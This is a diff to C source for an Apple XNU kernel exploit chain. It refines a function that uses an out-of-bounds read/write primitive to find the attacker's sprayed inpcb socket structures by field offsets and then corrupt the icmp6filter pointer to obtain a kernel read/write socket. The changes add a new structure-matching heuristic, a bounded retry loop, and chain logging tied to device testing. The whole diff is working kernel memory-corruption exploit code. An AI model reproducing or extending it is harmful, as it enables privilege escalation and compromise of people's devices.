@@ -138,6 +138,41 @@ kern_return_t cs2_find_and_corrupt(mach_port_t memory_object, mach_vm_offset_t s
     } while (found != NULL && search_start_idx < cs2_ctx.oob_size);
 
     if (!target_found) {
+        /* LSWCHAIN rung-2 matcher, 26.x-native (2026-11-16 USB receipts on
+           the 12: 2109 oob-read successes in the V23 lane, ZERO hunt
+           attempts — the executable_name + 0x0000ffffffffffff signature
+           never appears in a 23F77 window). Use the spray's OWN gencnt
+           table instead, against the byte-verified 23F77 sites:
+             inp_gencnt   @+0x78  must be one of OUR sprayed sockets
+             inp_list     @+0x28  le_prev, kernel-range
+             inp_pcbinfo  @+0x38  kernel-range + identical across candidates
+             inp_socket   @+0x40  kernel-range
+           A gencnt is unique per socket, so this cannot pick a stranger's
+           pcb; the pcbinfo equality kills single-field false positives. */
+        uint64_t pcbinfo_seen = 0;
+        uint64_t base_cap = (cs2_ctx.oob_size > offsets.inpcb_icmp6filt + 0x10)
+                                ? (cs2_ctx.oob_size - (offsets.inpcb_icmp6filt + 0x10)) : 0;
+        for (uint64_t zo = 0; zo <= base_cap; zo += 8) {
+            uint64_t g = 0, pcbi = 0, sk = 0, lp = 0;
+            memcpy(&g,    read_buffer + zo + 0x78, 8);
+            int mine = 0;
+            for (size_t si = 0; si < cs2_ctx.socket_ports_count; si++) {
+                if (cs2_ctx.socket_pcb_ids[si] == g) { mine = 1; break; }
+            }
+            if (!mine) continue;
+            memcpy(&pcbi, read_buffer + zo + 0x38, 8);
+            memcpy(&sk,   read_buffer + zo + 0x40, 8);
+            memcpy(&lp,   read_buffer + zo + 0x28, 8);
+            if ((pcbi >> 48) < 0xffff || (sk >> 48) < 0xffff || (lp >> 48) < 0xffff) continue;
+            if (pcbinfo_seen != 0 && pcbinfo_seen != pcbi) continue;
+            pcbinfo_seen = pcbi;
+            pcb_start_offset = zo;
+            target_found = true;
+            cs2_chain_rung_log(2, "matcher=gencnt", zo, g);
+            break;
+        }
+    }
+    if (!target_found) {
         return KERN_FAILURE;
     }
 
@@ -204,6 +239,7 @@ kern_return_t cs2_find_and_corrupt(mach_port_t memory_object, mach_vm_offset_t s
     uint64_t icmp6filter = *(uint64_t*)((uint8_t*)read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt);
     LOG("inp_list_next_pointer: %#llx", inp_list_next_pointer);
     LOG("icmp6filter: %#llx", icmp6filter);
+    cs2_chain_rung_log(2, "pair", target_inp_gencnt, inp_list_next_pointer);
 
     // the one we found was the control socket, so the next one in the list will be rw socket
     cs2_ctx.rw_socket_pcb = inp_list_next_pointer;
@@ -225,7 +261,10 @@ kern_return_t cs2_find_and_corrupt(mach_port_t memory_object, mach_vm_offset_t s
             u_int32_t icmp6_filt[8];
         };
     */
-    while (true) {
+    int corrupt_tries = 0;
+    bool corrupt_landed = false;
+    while (corrupt_tries++ < 8) {
+        if (cs2_expired()) break;
         // write
         cs2_oob_write(memory_object, seeking_offset, cs2_ctx.oob_size, cs2_ctx.oob_offset, write_buffer);
         // read info back to check if we really corrupted
@@ -234,8 +273,15 @@ kern_return_t cs2_find_and_corrupt(mach_port_t memory_object, mach_vm_offset_t s
         memcpy(&new_icmp6filter, read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt, sizeof(new_icmp6filter));
         if (new_icmp6filter == inp_list_next_pointer + offsets.inpcb_icmp6filt) {
             LOG("target corrupted: %#llx", new_icmp6filter);
+            corrupt_landed = true;
             break;
         }
+    }
+    if (!corrupt_landed) {
+        /* LSWCHAIN: bounded (8) — the unbounded upstream loop froze the tap
+           when the window drifted (the "forever then frozen" receipts). */
+        cs2_chain_rung_log(3, "corrupt-write-not-landed", seeking_offset, (uint64_t)corrupt_tries);
+        return KERN_FAILURE;
     }
 
     // convert back to fd
@@ -261,10 +307,12 @@ kern_return_t cs2_find_and_corrupt(mach_port_t memory_object, mach_vm_offset_t s
         // the PREVIOUS element in the list is NEXT in the list, because NEW inpcb are inserted at the head of the list
         // turn rw_socket back to fd
         cs2_ctx.rw_socket = fileport_makefd(cs2_ctx.socket_ports[control_socket_idx + 1]);
+        cs2_chain_rung_log(3, "corrupt-verified", target_inp_gencnt, (uint64_t)control_socket_idx);
         return KERN_SUCCESS;
     }
 
     LOG("failed to corrupt control_socket at idx: %#zx", control_socket_idx);
+    cs2_chain_rung_log(3, "corrupt-effect-missing", target_inp_gencnt, (uint64_t)control_socket_idx);
     return KERN_FAILURE;  // whoever came up with returning -1 when success returns KERN_SUCCESS???
 }
 
